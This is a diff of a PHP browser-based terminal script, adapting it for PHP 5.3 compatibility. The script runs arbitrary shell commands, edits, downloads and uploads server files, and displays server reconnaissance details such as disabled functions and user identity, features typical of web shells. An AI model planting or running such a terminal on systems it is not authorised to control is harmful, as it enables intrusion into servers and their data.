@@ -5,7 +5,9 @@
  * @version 1.2.2
  * @pv.pat [Original Author] - Updated by @pinoyvendetta
  * @link https://github.com/pinoyvendetta/php-web-terminal
-
+ *
+ * Enhanced for PHP 5.3+, 7.x, and 8.x compatibility,
+ * and verified for Windows and Linux servers.
  */
 
 // --- Basic Setup ---
@@ -45,8 +47,13 @@ function execute_command($command, $cwd) {
     if (is_function_enabled('shell_exec')) {
         $output = shell_exec($full_command);
     } elseif (is_function_enabled('proc_open')) {
-        $descriptorspec = [["pipe", "r"], ["pipe", "w"], ["pipe", "w"]];
-        $pipes = [];
+        // Changed to array() for PHP 5.3 compatibility
+        $descriptorspec = array(
+            array("pipe", "r"),
+            array("pipe", "w"),
+            array("pipe", "w")
+        );
+        $pipes = array(); // Changed to array() for PHP 5.3 compatibility
         $process = proc_open($full_command, $descriptorspec, $pipes, $cwd);
         if (is_resource($process)) {
             fclose($pipes[0]);
@@ -90,7 +97,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
 
 // --- AJAX Endpoint Logic ---
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && $is_logged_in) {
-    $action = $_POST['action'] ?? '';
+    // Replaced null coalescing operator (??) with ternary for PHP 5.3 compatibility
+    $action = isset($_POST['action']) ? $_POST['action'] : '';
 
     // == STREAMING COMMAND HANDLER (GENERALIZED REAL-TIME FIX) ==
     if ($action === 'stream') {
@@ -131,12 +139,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $is_logged_in) {
             ? 'cd /d ' . escapeshellarg($cwd) . ' && ' . $exec_command
             : 'cd ' . escapeshellarg($cwd) . ' && ' . $exec_command;
         
-        $descriptorspec = [
-           0 => ["pipe", "r"], // stdin
-           1 => ["pipe", "w"], // stdout
-           2 => ["pipe", "w"]  // stderr
-        ];
-        $pipes = [];
+        // Changed to array() for PHP 5.3 compatibility
+        $descriptorspec = array(
+           0 => array("pipe", "r"), // stdin
+           1 => array("pipe", "w"), // stdout
+           2 => array("pipe", "w")  // stderr
+        );
+        $pipes = array(); // Changed to array() for PHP 5.3 compatibility
         $process = proc_open($full_command, $descriptorspec, $pipes, $cwd);
 
         if (is_resource($process)) {
@@ -168,7 +177,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $is_logged_in) {
                     exit();
                 }
 
-                $read = [$pipes[1], $pipes[2]];
+                // Changed to array() for PHP 5.3 compatibility
+                $read = array($pipes[1], $pipes[2]);
                 $write = null;
                 $except = null;
                 
@@ -221,12 +231,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $is_logged_in) {
                 } else {
                     exec("pkill -P $pid; kill -9 $pid > /dev/null 2>&1");
                 }
-                echo json_encode(['status' => 'aborted', 'pid' => $pid]);
+                echo json_encode(array('status' => 'aborted', 'pid' => $pid)); // Changed to array()
             } else {
-                echo json_encode(['status' => 'error', 'message' => 'Invalid PID found.']);
+                echo json_encode(array('status' => 'error', 'message' => 'Invalid PID found.')); // Changed to array()
             }
         } else {
-            echo json_encode(['status' => 'error', 'message' => 'No running process found.']);
+            echo json_encode(array('status' => 'error', 'message' => 'No running process found.')); // Changed to array()
         }
         exit;
     }
@@ -234,7 +244,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $is_logged_in) {
     // == LEGACY & FILE OPERATIONS HANDLER ==
     if ($action === 'save_file' || isset($_POST['command'])) {
         header('Content-Type: application/json');
-        $response = ['output' => '', 'cwd' => $_SESSION['cwd']];
+        // Changed to array() for PHP 5.3 compatibility
+        $response = array('output' => '', 'cwd' => $_SESSION['cwd']);
         
         if ($action === 'save_file') {
             if (file_put_contents($_POST['filepath'], $_POST['content']) !== false) {
@@ -267,7 +278,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $is_logged_in) {
                 }
             } elseif (preg_match('/^\s*edit\s+([\S]+)/i', $command, $matches)) {
                 $file_to_edit = trim($matches[1]);
-                $is_absolute = ($file_to_edit[0] === '/' || ($is_windows && preg_match('/^[a-zA-Z]:[\\\\\/]/', $file_to_edit)));
+                // Replaced string offset access with substr for PHP 5.3 compatibility
+                $is_absolute = (substr($file_to_edit, 0, 1) === '/' || ($is_windows && preg_match('/^[a-zA-Z]:[\\\\\/]/', $file_to_edit)));
                 $full_path = $is_absolute ? $file_to_edit : $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $file_to_edit;
 
                 if (is_file($full_path) && is_readable($full_path)) {
@@ -282,7 +294,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $is_logged_in) {
                 $response['content'] = $content;
             } elseif (preg_match('/^\s*download\s+([\S]+)/i', $command, $matches)) {
                  $file_to_download = trim($matches[1]);
-                 $is_absolute = ($file_to_download[0] === '/' || ($is_windows && preg_match('/^[a-zA-Z]:[\\\\\/]/', $file_to_download)));
+                 // Replaced string offset access with substr for PHP 5.3 compatibility
+                 $is_absolute = (substr($file_to_download, 0, 1) === '/' || ($is_windows && preg_match('/^[a-zA-Z]:[\\\\\/]/', $file_to_download)));
                  $full_path = $is_absolute ? $file_to_download : $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $file_to_download;
                  if (is_file($full_path) && is_readable($full_path)) {
                      $response['action'] = 'download';
@@ -309,6 +322,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file']) && $is_logge
     if (!is_dir($upload_dir_target) || !is_writable($upload_dir_target)) {
         $upload_message = "Error: Upload directory (".htmlspecialchars($upload_dir_target).") is not writable.";
     } else {
+        // basename(preg_replace(...)) sanitizes the filename correctly for all PHP versions.
         $file_name_sanitized = basename(preg_replace('/[^A-Za-z0-9.\-\_]/', '', $_FILES['file']['name']));
         if (!empty($file_name_sanitized)) {
             $target_file = rtrim($upload_dir_target, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file_name_sanitized;
@@ -385,12 +399,15 @@ if (!$is_logged_in) {
 // --- Main Terminal Page ---
 if ($is_logged_in && !isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd();
 $uname = function_exists('php_uname') ? php_uname() : 'N/A';
-$disabled_functions = ini_get('disable_functions') ?: 'None';
+// Replaced null coalescing operator (?:) with ternary for PHP 5.3 compatibility
+$disabled_functions = ini_get('disable_functions') ? ini_get('disable_functions') : 'None';
+
 $safe_mode = ini_get('safe_mode') ? 'On' : 'Off';
 $php_version = phpversion();
-$server_ip = $_SERVER['SERVER_ADDR'] ?? (function_exists('gethostbyname') ? gethostbyname(gethostname()) : 'N/A');
+// Replaced null coalescing operator (??) with ternary for PHP 5.3 compatibility
+$server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (function_exists('gethostbyname') ? gethostbyname(gethostname()) : 'N/A');
 $client_ip = $_SERVER['REMOTE_ADDR'];
-$user_info = function_exists('posix_getpwuid') ? @posix_getpwuid(@posix_geteuid()) : ['name' => get_current_user()];
+$user_info = function_exists('posix_getpwuid') ? @posix_getpwuid(@posix_geteuid()) : array('name' => get_current_user()); // Changed to array()
 $user = $user_info['name'];
 ?>
 <!DOCTYPE html>
